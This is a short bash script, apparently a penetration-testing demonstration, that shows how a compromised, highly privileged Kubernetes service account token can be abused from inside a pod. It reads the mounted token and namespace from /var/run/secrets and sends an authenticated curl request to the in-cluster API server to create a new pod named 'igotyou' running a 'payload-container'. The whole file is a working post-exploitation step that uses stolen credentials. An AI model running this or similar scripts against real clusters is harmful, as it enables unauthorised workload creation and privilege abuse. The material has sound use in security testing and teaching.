#!/bin/bash

# ==============================================================================
#          ** K8s Pod Creation Script (from within a pod) **
#
# This script demonstrates how a compromised Service Account token with high
# privileges can be used to create new pods directly via the Kubernetes API.
#
# WARNING: For educational and testing purposes only.
# ==============================================================================

# --- Configuration ---
POD_NAME="igotyou"
# MODIFIED LINE: Changed the container image to Ubuntu 22.04 LTS
CONTAINER_IMAGE="ubuntu:22.04"
# Note the single quotes around the command array
CONTAINER_COMMAND='["sleep", "3600"]'

echo "--- Pod Creation Initiated ---"

# --- Auto-discovery ---
# The namespace is automatically detected from the pod's environment
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
echo "[INFO] Detected Namespace: $NAMESPACE"

# API server address is injected as an environment variable by Kubernetes
APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"
echo "[INFO] API Server URL: $APISERVER"

# --- Credentials ---
# Read the Service Account token from its default location
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
echo "[INFO] Service Account token loaded."

# Path to the cluster's CA certificate
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# --- API Request ---
echo "[ACTION] Sending request to create pod '$POD_NAME'..."

# Use curl to make the API call. The -s flag silences progress, -o /dev/null
# discards the body, and -w "%{http_code}" prints only the HTTP status code.
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
  --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -X POST \
  --data "{
      \"apiVersion\": \"v1\",
      \"kind\": \"Pod\",
      \"metadata\": {
          \"name\": \"$POD_NAME\"
      },
      \"spec\": {
          \"containers\": [
              {
                  \"name\": \"payload-container\",
                  \"image\": \"$CONTAINER_IMAGE\",
                  \"command\": $CONTAINER_COMMAND
              }
          ]
      }
  }" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/pods")

# --- Result ---
if [ "$HTTP_STATUS" -eq 201 ]; then
  echo "✅ SUCCESS! Pod '$POD_NAME' created successfully (HTTP Status: $HTTP_STATUS)."
else
  echo "❌ FAILED! The API server returned an error (HTTP Status: $HTTP_STATUS)."
  echo "         This likely means the token does not have 'create pod' permissions."
fi

echo "--- Script Finished ---"
